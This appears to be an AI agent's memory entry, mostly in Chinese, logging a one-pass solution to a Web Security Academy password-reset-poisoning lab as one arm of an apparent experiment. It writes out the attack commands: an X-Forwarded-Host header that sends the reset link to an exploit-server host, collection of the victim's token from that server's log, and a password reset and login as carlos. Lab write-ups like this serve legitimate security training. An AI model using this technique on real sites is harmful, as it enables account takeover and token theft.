---
metadata:
  node_type: memory
name: "PRS arm A lab-password-reset-poisoning-via-middleware"
description: "arm A 基线:lab-password-reset-poisoning-via-middleware 冷实例(reused:false)一次通过 — X-Forwarded-Host 投毒重置邮件链接主机到 exploit server,访问日志回收 token 后重置 carlos 口令登录,banner is-solved"
last_updated: 2026-10-09T08:28:59+08:00
created: 2026-10-09T08:28:59+08:00
---

2026-10-09T00:30+08:00 arm A 解法(冷实例 reused:false,一次通过)

实例:https://0a7900ca03552cf78135b1b300250035.web-security-academy.net/(jar /tmp/cj1.json)

链路(4 件):
1. `range_launch launch-url /web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware --jar /tmp/cj1.json` → 30.9s 得实例。
   **坑**:信封 `exploit_server:null`,但 lab 横幅里其实有 `https://exploit-0ab90067039f2c1581b8b0fb01db007c.exploit-server.net`(GET /forgot-password 即泄)。勿信 range_launch 的 null 判无 exploit server,读一次实例页即可坐实。
2. `http_session post /forgot-password --header 'X-Forwarded-Host: exploit-0....exploit-server.net' --form username=carlos` → 200 "Please check your email"(表单无 csrf)。
3. 约 5s 后 victim(carlos)点击:`http_session get https://exploit-0....exploit-server.net/log` → 日志行 `GET /forgot-password?temp-forgot-password-token=qg3khf54b73038590vhacg6v049guvd5`(user-agent "(Victim)")。
4. 带 token GET 重置页取表单字段(temp-forgot-password-token 隐藏域 + new-password-1/2),POST 三者 → 302 `/`;再 POST /login username=carlos&password=ResetPw12345(无 csrf)→ 302 `/my-account?id=carlos`。

判 solved 的翻牌点(与既往一致):POST /login 的 302 不翻牌,GET /my-account?id=carlos 首访才落 `academyLabBanner is-solved` + "Congratulations, you solved the lab!";先前的 banner_verdict 读首页返回 solved:false 是终页未访的假阴性。

关键面:该 lab 不需要 relay 服务器,邮件链接主机名直接由 X-Forwarded-Host 重写(burp_collab 公开域亦可替代);token 明文出现在 victim 请求路径中,exploit server 访问日志即回收点。

